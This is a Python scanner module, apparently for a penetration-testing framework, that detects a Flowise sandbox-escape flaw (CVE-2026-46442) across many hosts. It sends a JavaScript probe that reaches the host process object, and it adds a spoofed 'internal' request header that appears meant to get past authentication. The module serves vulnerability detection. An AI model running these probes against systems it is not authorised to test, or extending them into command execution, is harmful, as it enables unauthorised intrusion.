import json
import ssl
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

NODE_FN = "/api/v1/node-custom-function"
MARKER = "METIS_46442_OK"

@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""

class FlowiseCve202646442Scanner(Auxiliary):
    NAME = "Flowise node-custom-function RCE Detection (CVE-2026-46442)"
    DESCRIPTION = (
        "Detects the NodeVM sandbox escape in Flowise < 3.1.2 via "
        "/api/v1/node-custom-function. Uses a benign JS payload that "
        "raises an exception containing a marker (proving sandbox escape "
        "into host-realm) without executing system commands."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    SEVERITY = "critical"
    DISCLOSED = "2026-07-14"
    CHECK = True
    REFERENCES = [
        "CVE-2026-46442",
        "https://nvd.nist.gov/vuln/detail/CVE-2026-46442",
    ]
    OPTIONS = [
        Option("RHOSTS", required=True, description="target(s)"),
        Option("RPORT", default=3000, type=int, description="Flowise HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("APIKEY", default="", description="optional API key"),
        Option("TIMEOUT", default=15.0, type=float, description="per-request timeout"),
        Option("THREADS", default=20, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool, description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts: raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _probe(self, host):
        url = self._base(host) + NODE_FN
        ctx = ssl._create_unverified_context()
        js = (
            "var p = process.mainModule; "
            "throw new Error('" + MARKER + ":' + (typeof p));"
        )
        body = json.dumps({
            "functionBody": js,
            "nodeData": {"inputs": {}},
        }).encode()
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("x-request-from", "internal")
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        if self.options["APIKEY"]:
            req.add_header("Authorization", "Bearer " + self.options["APIKEY"])
        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                text = r.read().decode(errors="replace"); status = r.status
        except urllib.error.HTTPError as e:
            text = e.read().decode(errors="replace"); status = e.code
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", type(e).__name__)
        if MARKER in text and "object" in text:
            return HostResult(host, "vulnerable", "sandbox escape marker observed")
        if status == 401:
            return HostResult(host, "safe", "unauthenticated (API key required)")
        return HostResult(host, "safe", "HTTP " + str(status))

    def _record(self, h):
        svc = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(h.host, self.options["RPORT"], proto="tcp",
                            state="open", name=svc, banner="Flowise")
        self.report_vuln(name=self.NAME, address=h.host, severity="critical",
                         refs="CVE-2026-46442", info=h.detail)

    def check(self):
        host = self._expand_targets()[0]
        print(colors.info("check: probing " + self._base(host) + NODE_FN))
        r = self._probe(host)
        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"]); stop_first = self.options["STOP_ON_FIRST"]
        print(colors.info("scanning " + str(len(targets)) + " host(s)"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits, clean, unknown, aborted = [], 0, 0, False
        db = self._db(); ws = bool(db and db.current_workspace_id())
        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try: r = fut.result()
                    except Exception: unknown += 1; continue
                    if r.state == "vulnerable":
                        hits.append(r); bar.log(colors.vuln(r.host + " - " + r.detail))
                        if ws: self._record(r)
                        if stop_first:
                            aborted = True
                            for f in futures: f.cancel()
                            break
                    elif r.state == "safe": clean += 1
                    else: unknown += 1
        finally:
            bar.done()
        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.warn(str(unknown)))
        if aborted: print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        return hits
